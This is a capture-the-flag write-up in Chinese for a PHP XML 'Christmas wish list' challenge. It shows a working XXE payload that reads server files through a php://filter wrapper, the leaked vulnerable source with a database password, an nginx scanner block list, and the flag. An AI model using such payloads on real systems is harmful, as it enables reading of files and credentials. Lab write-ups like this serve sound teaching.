# Our Chritsmas Wish List

打開網站

可以看到他會讀我們POST過去的東西

然後可以看到關鍵字`xml`，所以估計是XXE

隨便POST個東西過去，還會噴錯:

` Warning: simplexml_load_string(): Entity: line 1: parser error : Start tag expected, '<' not found in /var/www/html/index.php on line 18`

很明顯就是XXE

送

```xml
<!DOCTYPE kaibro[
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.ph">
]>
<root>&xxe;</root>
```

可以讀出source code:

```php
<?php
//error_reporting(0);
//$conn = new mysqli("localhost:3306/run/mysqld/mysqld.sock", "root", "HTsPAccessKey");

//if ($conn->connect_error)
	//die("Connection failed: " . $conn->connect_error);

//$conn->query("USE wishes");

session_start();

if (!isset($_SESSION['wishes'])) {
	$_SESSION['wishes'] = array();
}

libxml_disable_entity_loader(false);
$dataPOST = trim(file_get_contents('php://input'));
$xmlData = simplexml_load_string($dataPOST, 'SimpleXMLElement', LIBXML_NOENT);

if ($xmlData != "") {
	$_SESSION['wishes'][] = (string) $xmlData;
	//$sql = "INSERT INTO wishes (IP, timestamp, message) VALUES ('" . $_SERVER['REMOTE_ADDR'] . "', '" . time() . "', '" . mysqli_real_escape_string($conn, (string) $xmlData) . "')";
	//if ($conn->query($sql) === TRUE) {
	//	echo "New record created successfully ";
	//} else {
	//	echo "Error! ";
	//}
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	echo "Your wish: " . $xmlData;
	die();
}

//$wishes = $conn->query("SELECT *, message FROM wishes ORDER BY timestamp DESC");
?>

<head>
<link href="https://fonts.googleapis.com/css?family=Mountains+of+Christmas" rel="stylesheet">
</head>

<style>
.text {
	font-family: 'Mountains of Christmas', cursive;
}

textarea {
	resize: none;
box-shadow:
	0 0 0 2px #FFFFFF,
	0 0 0 4px #FF0000;
-moz-box-shadow:
	0 0 0 4px #FFFFFF,
	0 0 0 2px #FF0000;
-webkit-shadow:
	0 0 0 4px #FFFFFF,
	0 0 0 2px #FF0000;
}

button {
	background-color: Transparent;
	background-repeat: no-repeat;
	border: none;
	cursor: pointer;
	overflow: hidden;
	outline:none;
	background: url("paper_airplane.png");
	background-size:cover;
	height:64px;
	width:64px;
	opacity:0.6;
}

li {
	font-size: 24px;
	word-wrap: break-word;
}
</style>

<script>
function lol () {
	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function() {
		if (xhttp.readyState == 4 && xhttp.status == 200) {
			document.location.reload();
		}
	};
	
	var xml = "<message>" + document.getElementById("textarea").value + "</message>";
	xhttp.open("POST", "/", true);
	xhttp.setRequestHeader('Content-Type', 'application/xml');
	xhttp.send(xml);
};
</script>

<body background="paper.jpg" style = "margin-left:25px; margin-top:25px;">
	<p class="text" style="font-size: 60px">Our Christmas Wishlist!</p>
	<textarea id="textarea" rows="6" cols="50" placeholder="I wish for a pony..." class="text" style="font-size: 30px"></textarea>
	<button style="position:relative; bottom:90px; left:20px;" onclick="lol();"></button>
	
	<div style="margin-top:24px;">
		<?php
			foreach($_SESSION['wishes'] as $msg) {
				echo '<li>' . $msg . '</li><hr>';
			}
		?>
	</div>
</body>
```

但沒看到flag在哪

試著翻箱倒櫃一下

可以在`/etc/nginx/sites-enabled/default.conf`裡提示了flag的位置

```
limit_req_zone $binary_remote_addr zone=timelimit:1m rate=5r/s;

server {
	listen   80; ## listen for ipv4; this line is default and implied
	listen   [::]:80 default ipv6only=on; ## listen for ipv6

	limit_req zone=timelimit burst=20 nodelay;
	keepalive_requests 50;
	keepalive_timeout 20s;

	root /var/www/html;
	index index.php index.html index.htm;
	server_name _;

	# Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html
	sendfile off;

	# Add stdout logging
	error_log /dev/stdout info;
	access_log /dev/stdout;

	location ~* /flag.txt {
		deny all;
	}

	location / {
		try_files $uri $uri/ =404;
	}

	# pass the PHP scripts to FastCGI server listening on socket
	location ~ \.php$ {
                try_files $uri =404;
		fastcgi_split_path_info ^(.+\.php)(/.+)$;
		fastcgi_pass unix:/var/run/php-fpm.sock;
		fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    		fastcgi_param SCRIPT_NAME $fastcgi_script_name;
		fastcgi_index index.php;
		include fastcgi_params;
	}

        location ~* \.(jpg|jpeg|gif|png|css|js|ico|webp|tiff|ttf|svg)$ {
                expires           5d;
        }

	# deny access to . files, for security
	location ~ /\. {
    		log_not_found off;
    		deny all;
	}

	if ($http_user_agent ~* (^w3af.sourceforge.net|dirbuster|nikto|SF|sqlmap|fimap|nessus|whatweb|Openvas|jbrofuzz|libwhisker|webshag) ) {
		return 403;
	}

	add_header X-XSS-Protection "1; mode=block";

	error_page 404 500 502 504 /500.html;

	location = /500.html {
		root /var/www/html;
	}
}
```

直接讀`/var/www/html/flag.txt`:

`X-MAS{_The_Ex73rnal_Ent1t13$_W4n7_To__Jo1n_7he_p4r7y__700______}`
